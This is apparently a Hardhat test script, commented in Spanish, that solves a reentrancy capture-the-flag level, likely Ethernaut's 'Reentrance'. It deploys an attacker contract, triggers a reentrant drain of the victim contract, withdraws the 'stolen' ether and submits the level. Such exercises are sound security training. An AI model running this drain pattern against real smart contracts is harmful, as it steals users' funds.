import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
let balanceInicial:any, balanceFinal:any = 0;
const LEVEL_ADDRESS = "0xe6BA07257a9321e755184FB2F995e0600E78c16D";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  balanceInicial = (await ethers.provider.getBalance(eoa.getAddress())).toString();
  console.log(`El balance de mi cuenta es: `, balanceInicial);
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Reentrance`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS,
    ethers.utils.parseEther(`1`)
    );
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`El balance del contrato victima es: `, (await challenge.provider.getBalance(challenge.address)).toString());

  //Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`OchoMinutos`);
  attacker = await attackerFactory.deploy(challenge.address);
  console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Reentrancy Challenge", async () => {

  it("Resuelve el challenge - Reentrancy", async () => {
    let tx = await attacker.donarYAtacar({
      value: ethers.utils.parseEther(`1`),
      gasLimit: BigNumber.from(`2000000`)
    });
    await tx.wait();

    console.log(`El balance del contrato victima es: `, (await challenge.provider.getBalance(challenge.address)).toString());
    let txRetiro = await attacker.retirarEtherRobado();
    await txRetiro.wait();
    balanceFinal = (await ethers.provider.getBalance(eoa.getAddress())).toString();
    console.log(`El balance de mi cuenta es: `, balanceFinal);
    console.log(`LA DIFERENCIA EN MI BALANCE FUE DE: `, balanceFinal-balanceInicial);
  })
})

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});